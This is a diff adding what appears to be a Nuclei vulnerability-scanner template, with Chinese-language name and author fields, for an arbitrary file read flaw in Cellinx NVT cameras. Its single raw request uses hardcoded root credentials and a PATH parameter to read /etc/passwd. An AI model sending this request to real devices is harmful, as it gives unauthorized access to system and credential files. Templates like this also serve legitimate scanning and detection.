@@ -1,0 +1,24 @@
+id: CellinxNVT-GetFileContent_cgi-FileRead
+
+info:
+  name: Cellinx NVT 摄像机 GetFileContent.cgi 任意文件读取漏洞
+  author: 帝国绝凶虎の理塘纯真丁一郎
+  severity: high
+
+variables:
+  
+
+http:
+  - raw:
+      - |
+          GET /cgi-bin/GetFileContent.cgi?USER=root&PWD=D1D1D1D1D1D1D1D1D1D1D1D1A2A2B0A1D1D1D1D1D1D1D1D1D1D1D1D1D1D1B8D1&PATH=/etc/passwd HTTP/1.1
+          Host: {{Hostname}}
+
+
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+          - 'contains(body, "$$")'
